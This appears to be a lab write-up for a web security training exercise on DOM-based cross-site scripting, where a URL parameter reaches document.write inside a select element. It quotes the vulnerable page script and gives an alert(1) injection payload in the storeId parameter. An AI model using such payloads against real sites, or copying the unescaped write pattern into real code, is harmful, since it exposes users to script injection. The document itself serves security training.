## 10 - DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

## Notes

- /product/stock
- `/resources/js/stockCheck.js`

## Resume

1. Go on `/product` page
2. Find the js in source
3. Exploit the XSS


## Solve

Go over any product and check the source code to find : 

```js
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
        continue;
        }
            document.write('<option>'+stores[i]+'</option>');
        }
        document.write('</select>')
</script>
```

It grabs **storeId** from `window.location.search` via `URLSearchParams`, writes an opening `<select name="storeId">` tag, adds a selected option if the param exists, then loops through stores to append unselected options (skipping the current one), and closes the tag.

Using the following payload, wen can call an `alert()` fonction :

```
/product?productId=1&storeId=<script>alert(1)</script>
```

```js
<script>alert(1)</script>
```